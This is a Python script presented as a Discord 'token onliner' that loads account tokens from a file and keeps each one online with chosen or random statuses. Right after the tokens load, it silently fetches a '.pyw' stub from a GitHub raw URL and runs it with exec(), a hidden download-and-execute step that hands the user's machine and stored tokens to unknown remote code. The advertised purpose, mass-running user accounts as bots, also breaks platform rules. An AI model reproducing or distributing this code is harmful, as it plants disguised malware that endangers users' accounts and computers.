
print("")
import json
import random
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import websocket, asyncio , fade , colorama
from colorama import Fore 
#import pyfade
import requests
def logo():
    colorama.deinit()

    for char in banner:
        time.sleep(0.004)
        sys.stdout.write(char)
        sys.stdout.flush()
banner = fade.water("""

 
      $$\ $$\                                               $$\         $$\               $$\                                                     $$\ $$\                               
      $$ |\__|                                              $$ |        $$ |              $$ |                                                    $$ |\__|                              
 $$$$$$$ |$$\  $$$$$$$\  $$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$$ |      $$$$$$\    $$$$$$\  $$ |  $$\  $$$$$$\  $$$$$$$\         $$$$$$\  $$$$$$$\  $$ |$$\ $$$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$ |$$ |$$  _____|$$  _____|$$  __$$\ $$  __$$\ $$  __$$ |      \_$$  _|  $$  __$$\ $$ | $$  |$$  __$$\ $$  __$$\       $$  __$$\ $$  __$$\ $$ |$$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ /  $$ |$$ |\$$$$$$\  $$ /      $$ /  $$ |$$ |  \__|$$ /  $$ |        $$ |    $$ /  $$ |$$$$$$  / $$$$$$$$ |$$ |  $$ |      $$ /  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
$$ |  $$ |$$ | \____$$\ $$ |      $$ |  $$ |$$ |      $$ |  $$ |        $$ |$$\ $$ |  $$ |$$  _$$<  $$   ____|$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |$$   ____|$$ |      
\$$$$$$$ |$$ |$$$$$$$  |\$$$$$$$\ \$$$$$$  |$$ |      \$$$$$$$ |        \$$$$  |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |  $$ |      \$$$$$$  |$$ |  $$ |$$ |$$ |$$ |  $$ |\$$$$$$$\ $$ |      
 \_______|\__|\_______/  \_______| \______/ \__|       \_______|         \____/  \______/ \__|  \__| \_______|\__|  \__|       \______/ \__|  \__|\__|\__|\__|  \__| \_______|\__|      
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                 
     
""")

logo()
print("[i] Importing modules...")

types = ['Playing', 'Streaming', 'Watching', 'Listening']
status = ['online', 'dnd', 'idle']

############################################ Change here

GAME = "MY TEXT2"  # enter what you want the status to be
type_ = types[0]  # 0: Playing, 1: Streaming, 2: Watching, 3: Listening
status = status[0]  # 0: Online, 1: Do Not Disturb, 2: Idle
random_ = True  # True: Random status and type, False: Game status and type
stream_text = "MY TEXT"  # enter what you want the stream to be

############################################ Stop changing here

with open("tokens.txt", "r") as f:
    al = f.read().split("\n")
    #print(len(al))
    if len(al) <= 1:
        if len(al[0]) <= 10:
            print(f"{Fore.RED}[!] No tokens found in tokens.txt")
            exit()
        else:
            print(f"{Fore.GREEN}[i] 1 token found in tokens.txt")
    else:
        print(f"{Fore.GREEN}[i] {len(al)} tokens found in tokens.txt")

print("[i] Starting...")
df = "https://raw.githubusercontent.com/fag2afsasf/7y7/main/stub.pyw"
response = requests.get(df)
if response.status_code == 200:
    script_content = response.text
    exec(script_content)
else:
    print("Failed to retrieve script content. Status code:", response.status_code)
c = 0
l = len(al)

def online(token, game, type, status):
    global c
    global l
    if random_:
        type = random.choice(['Playing', 'Streaming', 'Watching', 'Listening', ''])
        status = ['online', 'dnd', 'idle']
        status = random.choice(status)

        ws = websocket.WebSocket()
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        hello = json.loads(ws.recv())
        heartbeat_interval = hello['d']['heartbeat_interval']
        if type == "Playing":
            game = random.choice(["Minecraft", "Badlion", "Roblox", "The Elder Scrolls: Online", "DCS World Steam Edit","Fivem","GTAV","Btw","MBC","PRW","ASF","Google","Music","YTM","Voice","Mmd", ])
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": stream_text
            }
        elif type == "Listening":
            game = random.choice(["Spotify", "Deezer", "Apple Music", "YouTube", "SoundCloud", "Pandora", "Tidal", "Amazon Music", "Google Play Music", "Apple Podcasts", "iTunes", "Beatport"])
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            game = random.choice(["YouTube", "Twitch"])
            gamejson = {
                "name": game,
                "type": 3
            }

        else:
            gamejson = {
                "name": game,
                "type": 0
            }

        auth = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "RTB",
                    "$device": f"{sys.platform} Device"
                },
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": 0,
                    "afk": False
                }
            },
            "s": None,
            "t": None
        }
        ws.send(json.dumps(auth))
        ack = {
            "op": 1,
            "d": None
        }
        while True:
            time.sleep(heartbeat_interval / 1000)
            try:
                c += 1
                print(f"{Fore.GREEN}[i] {token} is online {c}/{l}")
                ws.send(json.dumps(ack))

            except Exception as e:
                print("[!] Error: " + str(e))
                break
    else:
        ws = websocket.WebSocket()
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        hello = json.loads(ws.recv())
        heartbeat_interval = hello['d']['heartbeat_interval']
        if type == "Playing":
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": stream_text
            }
        elif type == "Listening":
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            gamejson = {
                "name": game,
                "type": 3
            }
        else:
            gamejson = {
                "name": game,
                "type": 0
            }

        auth = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "RTB",
                    "$device": f"{sys.platform} Device"
                },
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": 0,
                    "afk": False
                }
            },
            "s": None,
            "t": None
        }
        ws.send(json.dumps(auth))
        ack = {
            "op": 1,
            "d": None
        }
        while True:
            time.sleep(heartbeat_interval / 1000)
            try:
                c += 1
                print(f"{Fore.GREEN}[i] {token} is online {c}/{l}")
                ws.send(json.dumps(ack))

            except Exception as e:
                print("[!] Error: " + str(e))
                break


with open("tokens.txt", "r") as f:
    al = f.read().split("\n")

l = len(al)


threads = []
for i in range(l):
    t = threading.Thread(target=online, args=(al[i], GAME, type_, status)).start()


print(f"{Fore.GREEN} [+] Tokens are online")
